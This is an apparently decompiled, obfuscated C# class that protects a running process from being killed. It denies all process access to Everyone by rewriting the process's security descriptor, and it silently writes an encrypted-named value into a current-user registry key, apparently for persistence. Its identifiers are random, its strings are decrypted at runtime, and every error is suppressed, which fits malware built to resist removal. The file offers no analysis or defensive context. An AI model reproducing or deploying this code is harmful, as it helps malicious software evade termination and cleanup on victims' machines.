using System;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace eltZnUpwRizyZ;

internal sealed class EYeYEZtDXZdk
{
	[NonSerialized]
	internal static GetString _0004;

	[DllImport("advapi32.dll", EntryPoint = "GetKernelObjectSecurity", SetLastError = true)]
	private static extern bool HVEfBBOnXvTfvrI(IntPtr vxkgoGFLaaVPu, int mTipUfZeMWXUuoWb, [Out] byte[] cjZAfNgDUiOC, uint UgqJBHPoCkByFB, out uint QZZVedHZiRGDxGLy);

	[DllImport("advapi32.dll", EntryPoint = "SetKernelObjectSecurity", SetLastError = true)]
	private static extern bool YcnLxzQWnBkFhy(IntPtr RiILquFZQUzo, int oPUAXYXBDBOzNq, [In] byte[] NyWkxtkEuqTV);

	[DllImport("kernel32.dll", EntryPoint = "GetCurrentProcess")]
	private static extern IntPtr qmuRiIdlmrzDUo();

	public void OfOVzWsVFfe(bool P_0)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(OPwDdsoVlNU.KsnoBrbTQSaN(_0004(107401970)));
			registryKey.SetValue(OPwDdsoVlNU.KsnoBrbTQSaN(_0004(107401897)), _0004(107403047));
			registryKey.Close();
		}
		catch
		{
		}
	}

	private RawSecurityDescriptor HLCFrWJpMBAQ(IntPtr P_0)
	{
		byte[] cjZAfNgDUiOC = new byte[0];
		HVEfBBOnXvTfvrI(P_0, 4, cjZAfNgDUiOC, 0u, out var QZZVedHZiRGDxGLy);
		if (QZZVedHZiRGDxGLy < 0 || (long)QZZVedHZiRGDxGLy > 32767L)
		{
			return null;
		}
		if (!HVEfBBOnXvTfvrI(P_0, 4, cjZAfNgDUiOC = new byte[QZZVedHZiRGDxGLy], QZZVedHZiRGDxGLy, out QZZVedHZiRGDxGLy))
		{
			return null;
		}
		return new RawSecurityDescriptor(cjZAfNgDUiOC, 0);
	}

	private void wTtxvvIiYtCtZtsJ(IntPtr P_0, RawSecurityDescriptor P_1)
	{
		byte[] array = new byte[P_1.BinaryLength];
		P_1.GetBinaryForm(array, 0);
		YcnLxzQWnBkFhy(P_0, 4, array);
	}

	public void pmYRPBmxbKDvQSJ()
	{
		try
		{
			IntPtr intPtr = qmuRiIdlmrzDUo();
			RawSecurityDescriptor rawSecurityDescriptor = HLCFrWJpMBAQ(intPtr);
			rawSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
			wTtxvvIiYtCtZtsJ(intPtr, rawSecurityDescriptor);
		}
		catch (Exception)
		{
		}
	}

	static EYeYEZtDXZdk()
	{
		Strings.CreateGetStringDelegate(typeof(EYeYEZtDXZdk));
	}
}
